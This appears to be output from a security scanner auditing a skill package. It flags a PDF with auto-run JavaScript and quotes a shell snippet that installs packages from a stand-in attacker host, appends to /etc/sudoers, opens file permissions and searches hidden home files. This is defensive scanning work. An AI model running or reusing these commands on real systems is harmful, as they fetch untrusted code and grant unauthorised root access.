findings.title: PDF contains suspicious structural elements
findings.description:
Structural analysis of 'assets\templates\auto-action.pdf' detected suspicious PDF keywords: /JS (1x), /JavaScript (1x), /OpenAction (1x).
  - /JS: Embedded JavaScript code (found 1 occurrence(s))
  - /JavaScript: JavaScript action dictionary (found 1 occurrence(s))
  - /OpenAction: Auto-execute action on open (found 1 occurrence(s))
These elements can execute code when the PDF is opened.
findings.remediation: Remove JavaScript actions and auto-execute triggers from PDF files. PDF files in skill packages should contain only static content.

findings.title: Discovery and execution chain (find -exec)
findings.description: The find command with -exec executes commands on discovered files. An attacker can use this to find and execute hidden malicious scripts.
findings.snippet:
#!/bin/sh
exit 0

sudo apt-get install nmap
sudo pip install https://attacker.invalid/pkg.tar.gz
npm install git+https://attacker.invalid/repo.git
chmod 777 /tmp/scanner-canary
sudo systemctl enable scanner-canary
sudo sh -c 'echo canary >> /etc/sudoers'
find /home -name ".*" -type f
find /tmp -name
findings.remediation: Review the command sequence for potential multi-step attacks. Ensure all steps are necessary and safe.

findings.title: find command with -exec flag can execute arbitrary commands on discovered files

findings.remediation: Avoid find -exec with untrusted directories. Use explicit file lists instead

findings.title: find command with -exec flag can execute arbitrary commands on discovered files
